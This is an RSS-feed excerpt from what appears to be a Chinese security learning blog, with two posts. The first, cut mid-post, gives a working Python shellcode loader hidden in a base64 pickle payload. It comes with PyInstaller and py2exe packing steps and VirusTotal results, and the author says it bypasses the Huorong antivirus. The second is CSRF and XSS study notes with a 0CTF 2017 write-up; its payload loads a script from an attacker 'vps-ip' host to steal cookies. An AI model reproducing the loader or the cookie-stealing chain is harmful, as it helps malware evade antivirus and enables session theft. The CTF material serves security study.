&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(_shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">buf = (ctypes.c_char * len(_shellcode)).from_buffer(_shellcode)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">ctypes.windll.kernel32.RtlMoveMemory(
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_uint64(ptr),
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> buf,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_int(len(_shellcode))
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">handle = ctypes.windll.kernel32.CreateThread(
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_int(0),
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_int(0),
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_uint64(ptr),
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_int(0),
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_int(0),
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.pointer(ctypes.c_int(0))
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exec&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">A&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ret_base64&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ret&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ret_base64&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>被pyinstaller或py2exe打包的部分 pack1.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">urllib.request&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">codecs&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ret_base64&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ret_base64&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>PyInstaller&lt;/li>
&lt;/ul>
&lt;p>打包的更多参数参见&lt;a href="https://pyinstaller.org/en/stable/usage.html">doc: Using PyInstaller&lt;/a>，生成exe在dist文件夹中&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>pip3 install pyinstaller
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pyinstaller --noconsole --onefile pack1.py -n demo1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># --noconsole 无黑框&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># --onefile 单一文件&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -i 指定favicon&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -n 生成exe名字&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>就以这样最简单的方式制作的加载器的查杀情况是&lt;a href="https://www.virustotal.com/gui/file/56420390689318d252b5aab886cb7aad52ee919e99896598306ed938dfc3cdf1">22/66&lt;/a>，可以直接过火绒&lt;/p>
&lt;ul>
&lt;li>py2exe（*亲测 生成的exe文件大小小于PyInstaller 但一定概率无法执行 ）&lt;/li>
&lt;/ul>
&lt;p>中间媒介pack2.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">distutils.core&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">setup&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">py2exe&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">setup&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">options&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;py2exe&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;optimize&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e"># 优化级别最高，&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;bundle_files&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e"># 将生成的调用文件打包进exe文件&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;compressed&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e"># 压缩&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">windows&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[{&lt;/span>&lt;span style="color:#d88200">&amp;#34;script&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;pack1.py&amp;#34;&lt;/span>&lt;span style="color:#111">}],&lt;/span> &lt;span style="color:#75715e">#需要打包的程序的文件路径，windows-&amp;gt;GUI exe的脚本列表,console-&amp;gt; 控制台exe的脚本列表&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e"># 不生成library.zip文件，则捆绑在可执行文件中&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>pip3 install py2exe
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>python pack2.py py2exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>查杀情况&lt;a href="https://www.virustotal.com/gui/file/87c4fc12bd71bd1fce694393a6f6cab8a1b18424ef6d2d2d6ad062a65ab83bca">14/69&lt;/a>，可过火绒&lt;/p>
&lt;hr>
&lt;p>一开始就是做靶场的时候一时兴起看看免杀，后来发现里面门道还挺多的（我是土狗），估计以后有空还会认真学&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://haiderm.com/undetectable-backdooring-pe-file/">Undetectable backdooring PE file&lt;/a> | &lt;a href="https://scareing.github.io/2019/12/27/%E6%89%8B%E5%B7%A5shellcode%E6%B3%A8%E5%85%A5/">手工shellcode注入&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.secpulse.com/archives/132175.html">恶意程序编写之免杀基础&lt;/a> | &lt;a href="https://shu1l.github.io/2021/08/17/mian-sha-xue-xi-shellcode-jia-zai-mian-sha/">免杀学习&amp;ndash;shellcode加载免杀&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://webcache.googleusercontent.com/search?q=cache:oZ7CzvkDPFsJ:https://pukrr.github.io/2020/02/25/%25E5%2587%25A0%25E7%25A7%258D%25E5%258A%25A0%25E8%25BD%25BDshellcode%25E7%259A%2584%25E6%2596%25B9%25E6%25B3%2595/+&amp;amp;cd=4&amp;amp;hl=zh-CN&amp;amp;ct=clnk">几种加载shellcode的方法&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/Ne0nd0g/go-shellcode">go-shellcode&lt;/a> | &lt;a href="https://github.com/safe6Sec/GolangBypassAV">GolangBypassAV&lt;/a> | &lt;a href="https://github.com/pureqh/bypassAV">bypassAV&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.nday.top/2020/12/07/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/">Python Shellcode加载器绕过AV&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>cookie相关的xss&amp;csrf</title><link>https://amiaaaz.github.io/2022/04/24/xss-csrf-study-notes/</link><pubDate>Sun, 24 Apr 2022 21:58:17 +0800</pubDate><guid>https://amiaaaz.github.io/2022/04/24/xss-csrf-study-notes/</guid><description>&lt;p>&lt;a href="https://www.freebuf.com/articles/web/186880.html">前端安全系列（二）：如何防止CSRF攻击？&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://ctf-wiki.org/web/xss/#self-xss">Self-XSS 变废为宝的场景&lt;/a>&lt;/p>
&lt;hr>
&lt;h1 id="csrf">CSRF&lt;/h1>
&lt;p>跨站请求伪造，构造恶意页面让受害者点击，冒用受害者本地的凭证信息执行需要授权的特定操作（如注销账号等），把攻击者构造的请求当作受害者自己完成的请求，危害很大&lt;/p>
&lt;h2 id="常见类型">常见类型&lt;/h2>
&lt;ul>
&lt;li>GET类型&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">img&lt;/span> &lt;span style="color:#75af00">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://bank.example/withdraw?amount=10000&amp;amp;for=hacker&amp;#34;&lt;/span> &lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>POST类型&lt;/li>
&lt;/ul>
&lt;p>burpsuit可直接生成，再末尾可以加上&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">forms&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">submit&lt;/span>&lt;span style="color:#111">();&lt;/span> &lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>将会模拟用户的POST操作直接发包&lt;/p>
&lt;h2 id="防护绕过">防护&amp;amp;绕过&lt;/h2>
&lt;p>含CSRF payload的页面一般来自第三方网站，并且不能获取到cookie等凭据信息，只能使用&lt;/p>
&lt;p>针对这些，我们有以下的防护策略（当然会有相应的对抗措施）&lt;/p>
&lt;h3 id="同源检测">同源检测&lt;/h3>
&lt;h4 id="请求头">请求头&lt;/h4>
&lt;p>HTTP的请求包中包含这样两个Header&lt;/p>
&lt;pre tabindex="0">&lt;code>Origin:
Referer:
&lt;/code>&lt;/pre>&lt;p>两个请求头理论上都不能由前端来随便修改，两者都可以用来确定请求的来源域，但略有区别&lt;/p>
&lt;ul>
&lt;li>Origin：请求的域名，以下两种情况不存在&lt;/li>
&lt;/ul>
&lt;p>IE11不会在跨站CORS请求上添加Origin请求头&lt;/p>
&lt;p>302重定向&lt;/p>
&lt;ul>
&lt;li>Referer：请求的来源地址，有以下5种策略&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>策略名&lt;/th>
&lt;th>属性 - 新&lt;/th>
&lt;th>属性 - 旧&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>No Referer&lt;/td>
&lt;td>no-Referer&lt;/td>
&lt;td>never&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>No Referer When Downgrade&lt;/td>
&lt;td>no-Referer-when-downgrade&lt;/td>
&lt;td>default&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Origin Only&lt;/td>
&lt;td>(same or strict)origin&lt;/td>
&lt;td>origin&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Origin When Cross Origin&lt;/td>
&lt;td>(strict)origin-when-crossorigin&lt;/td>
&lt;td>-&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Unsafe URL&lt;/td>
&lt;td>unsafe-url&lt;/td>
&lt;td>always&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>我们将其设置为same-origin，表格因此需要把Referrer Policy的策略设置成same-origin，对于同源的链接和引用，会发送Referer，referer值为Host不带Path；跨域访问则不携带Referer；例如：&lt;code>aaa.com&lt;/code>引用&lt;code>bbb.com&lt;/code>的资源，不会发送Referer&lt;/p>
&lt;p>设置方式有三种：CSP设置；页面&lt;code>&amp;lt;meta&amp;gt;&lt;/code>标签；&lt;code>&amp;lt;a&amp;gt;&lt;/code>标签增加referer policy属性&lt;/p>
&lt;p>以下几种情况不含Referer：&lt;/p>
&lt;p>HTTPS-&amp;gt;HTTP；IE6,7下的window.location.href和window.open都会丢失；Flash到另一个网站时Referer比较杂乱；&lt;code>&amp;lt;a&amp;gt;&lt;/code>标签设置refererpolicy=&amp;ldquo;no-referer&amp;rdquo;&lt;/p>
&lt;h4 id="csrf-token">CSRF Token&lt;/h4>
&lt;p>要求用户请求携带一个攻击者无法获取到的Token，服务器通过校验Token来区分正常请求和攻击请求；Token不存在于cookie中（否则又会被冒用），存于服务器的session中&lt;/p>
&lt;ul>
&lt;li>添加token&lt;/li>
&lt;/ul>
&lt;p>遍历DOM，对于DOM中所有的&lt;code>&amp;lt;a&amp;gt;&lt;/code>和&lt;code>&amp;lt;form&amp;gt;&lt;/code>标签后加入token&lt;/p>
&lt;p>对于页面加载后动态生成的HTML没有办法&lt;/p>
&lt;p>验证码或密码也可以充当这样的效果&lt;/p>
&lt;ul>
&lt;li>检验token&lt;/li>
&lt;/ul>
&lt;p>服务端进行校验&lt;/p>
&lt;ul>
&lt;li>缺点&lt;/li>
&lt;/ul>
&lt;p>实现比较复杂，需要给每一个页面都写入Token（前端无法使用纯静态页面），每一个Form及Ajax请求都携带这个Token，后端对每一个接口都进行校验，并保证页面Token及请求Token一致，这就使得这个防护策略不能在通用的拦截上统一拦截处理，而需要每一个页面和接口都添加对应的输出和校验。这种方法工作量巨大，且有可能遗漏&lt;/p>
&lt;h1 id="cookie相关前置">cookie相关前置&lt;/h1>
&lt;p>&lt;a href="https://datatracker.ietf.org/doc/html/rfc6265#section-8.5">Weak Confidentiality&lt;/a>&lt;/p>
&lt;ul>
&lt;li>cookie使用domain和path作为同源限制，不区分端口和协议(http/https)；path向下通配；domain是向上通配的，所以&lt;u>子域名可以写cookie到父域&lt;/u>；&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>// a.b.com
cookie = &amp;#34;trash;domain=.b.com;&amp;#34;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>php处理同名cookie，取前者&lt;/li>
&lt;li>Tornado处理同名cookie，后者覆盖前者；可利用这一点进行CSRF&lt;/li>
&lt;/ul>
&lt;p>参考：&lt;a href="https://www.leavesongs.com/HTML/zhihu-xss-worm.html">知乎某处XSS+刷粉超详细漏洞技术分析&lt;/a>&lt;/p>
&lt;ul>
&lt;li>可以通过设置path来调整优先级&lt;/li>
&lt;/ul>
&lt;p>path相同长度，创建时间更早更优先；path更长更优先&lt;/p>
&lt;pre tabindex="0">&lt;code>path = /admin
path = /admin/ 优先
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>每一个cookie都有与之相关的域，这个域的范围一般通过&lt;code>domain&lt;/code>属性指定&lt;/li>
&lt;/ul>
&lt;p>如果域与页面的域相同，称为第一方cookie，不同则称为第三方cookie；一个页面包含图片或存放其它域上的资源时，第一方的cookie也只会发送到设置它们的服务器&lt;/p>
&lt;h1 id="xss--csrf">XSS + CSRF&lt;/h1>
&lt;p>攻击流程&lt;/p>
&lt;ul>
&lt;li>首先一个xss触发点&lt;/li>
&lt;li>payload中包含iframe，在框架内让受害者进行CSRF&lt;/li>
&lt;/ul>
&lt;p>主要看下面的例题就完事了&lt;/p>
&lt;h1 id="in-ctf">in CTF&lt;/h1>
&lt;h2 id="0ctf-2017complicated-xss">[0CTF 2017]complicated xss&lt;/h2>
&lt;p>有两个站 &lt;code>http://admin.government.vip:8000&lt;/code>（有flag）和&lt;code>http://government.vip/&lt;/code>（主站）&lt;/p>
&lt;p>主站有xss点，无防护，是在当前的主站点触发xss&lt;/p>
&lt;p>admin的那个子域的站有登录框，默认test: test弱口令可以低权限登入，登入后发现cookie的username字段有xss点（内容输出到页面的&lt;code>&amp;lt;h1&amp;gt;&lt;/code>标签中），不过页面存在沙箱&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//sandbox
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">Function&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">alert&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">XMLHttpRequest&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">Proxy&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Image&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">delete&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">postMessage&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>工作方式是删除了很多&lt;code>window.&lt;/code>这样的函数&lt;/p>
&lt;p>admin子域站还有upload的功能 但是只能admin账户才可登入，我们需要获得上传部分的代码来确定我们的payload构成，但是由于web的SOP同源策略，所以两个站跨域 读不到cookie&lt;/p>
&lt;p>这里要借助cookie中的SOP策略了，仅根据domain+path来区分，不依据port+protocol，所以我们可以在子域修改父域的cookie值&lt;/p>
&lt;pre tabindex="0">&lt;code>cookie=&amp;#34;username=&amp;lt;XSS code&amp;gt;;domain=.government.vip;&amp;#34;
&lt;/code>&lt;/pre>&lt;p>在这种情况下，访问admin子域站时就会携带以下两条cookie&lt;/p>
&lt;pre tabindex="0">&lt;code>username=&amp;#34;XSS; domain=.government.vip&amp;#34;
username=&amp;#34;test; domain=admin.government.vip; path=/&amp;#34;
&lt;/code>&lt;/pre>&lt;p>由于cookie的读取是无状态的，所以上面两条cookie在被后端解析时完全相同，选取哪条cookie完全取决于后端代码的实现，响应头指出后端框架是TornadoServer/4.4.2，会导致同名cookie后者覆盖前者，使我们的攻击实现&lt;/p>
&lt;p>结合上面的，我们的大致思路是这样的：&lt;/p>
&lt;p>主站xss来设置admin子域站的cookie值 然后再跳转到admin子域站 借由这里cookie的xss触发第二个xss&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>&lt;span style="color:#75af00">xss&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;script src=//vps-ip/xss/test.js&amp;gt;&amp;lt;\/script&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;username=&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">xss&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;testxss;domain=.government.vip;path=\/;&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>&lt;span style="color:#75af00">location&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://admin.government.vip:8000/&amp;#39;&lt;/span>&lt;span style="color:#111">;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>test.js 获取cookie&lt;/p>
